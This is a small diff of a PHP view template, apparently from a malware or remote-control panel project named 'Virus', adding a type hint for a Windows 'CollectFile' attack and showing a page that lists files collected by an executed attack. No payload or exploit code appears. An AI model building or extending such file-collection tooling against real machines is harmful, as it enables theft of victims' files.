@@ -2,6 +2,8 @@
 
 use function Kelvinho\Virus\map;
 
+/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectFile\CollectFile $attack */
+
 ?>
 <p>This attack is executed. Available files:</p>
 <ul style="overflow: auto;">
